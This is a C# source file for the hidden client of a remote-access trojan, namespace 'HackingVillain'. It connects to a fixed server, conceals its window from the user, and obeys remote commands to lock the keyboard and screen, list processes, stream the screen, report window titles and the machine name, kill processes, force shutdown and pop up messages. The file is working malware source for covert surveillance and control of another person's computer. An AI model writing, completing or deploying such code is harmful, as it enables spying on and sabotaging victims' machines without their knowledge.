using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using AwesomeSockets.Buffers;
using AwesomeSockets.Sockets;
using AwesomeSockets.Domain.Sockets;
using NetworkData;

using Buffer = AwesomeSockets.Buffers.Buffer;
namespace HackingVillain
{
    public partial class Client : Form
    {
        ISocket _client;
        Hooker _hook;
        LockForm _lock;
        Thread _listen;
        ScreenMonitor _monitor;
        public Client()
        {
            InitializeComponent();
            _client = AweSock.TcpConnect("192.168.0.1", 8080);
            _hook = new Hooker(_client);
            _monitor = new ScreenMonitor(_client);
            _lock = new LockForm(_hook);

            _listen = new Thread(() =>
            {
                while (true)
                {
                    Listen();
                    Thread.Sleep(1000);
                }
            });

            _listen.Start();

            this.FormBorderStyle = FormBorderStyle.None;
            this.Size = new System.Drawing.Size(0, 0);
            this.WindowState = FormWindowState.Minimized;
            this.ShowInTaskbar = false;
        }

        ~Client()
        {
            _hook.Dispose();
            _client.Close();
        }

        public static void Send(ISocket client, byte[] msg, int dataType)
        {
            Buffer b = Buffer.New();
            var datas = Data.SplitToDatas(msg, dataType);
            foreach (var dd in datas)
            {
                Buffer.Add(b, dd.Serialize());
                Buffer.FinalizeBuffer(b);
                client.SendMessage(b);
            }
        }

        public void Send(string msg, int dataType = 0)
        {
            Send(_client, Encoding.UTF8.GetBytes(msg), dataType);
        }

        void Listen()
        {
            Buffer coming = Buffer.New();
            _client.ReceiveMessage(coming);
            Buffer.FinalizeBuffer(coming);

            string data = Encoding.UTF8.GetString(Buffer.GetBuffer(coming));
            data = data.TrimEnd('\0');
            if (data == "Lock Key")
            {
                _hook.Lock();
            }
            else if (data == "UnLock Key")
            {
                _hook.UnLock();
            }
            else if (data == "Lock Screen")
            {
                _lock.Show();
            }
            else if (data == "UnLock Screen")
            {
                _lock.Fuck();
            }
            else if (data == "Show Me The Process")
            {
                var processes = from p in Process.GetProcesses()
                                where p.MainWindowTitle.Length > 0
                                select p.ProcessName;
                Send(string.Join("\n", processes), 1);
            }
            else if (data == "Show Me The Screen")
            {
                _monitor.Start();
                //ScreenMonitor.SendScreen(_client);
            }
            else if (data == "Stop Showing")
            {
                _monitor.Stop();
            }
            else if (data == "Info")
            {
                Send((ForegroundWindow.GetActiveWindowTitle() ?? "")
                    + "\n" + System.Environment.MachineName, 2);
            }
            else if (data.StartsWith("Kill"))
            {
                string name = data.Substring(5);
                try
                {
                    Process.GetProcessesByName(name)[0].Kill();
                }
                catch
                {

                }
            }
            else if (data == "Shutdown")
            {
                try
                {
                    Process.Start("shutdown", "/s /t 0");
                }
                catch
                {

                }
            }
            else if (data.StartsWith("Message"))
            {
                string msg = data.Substring(8);
                MessageBox.Show(msg, "서버로부터 메시지");
            }
        }
    }
}
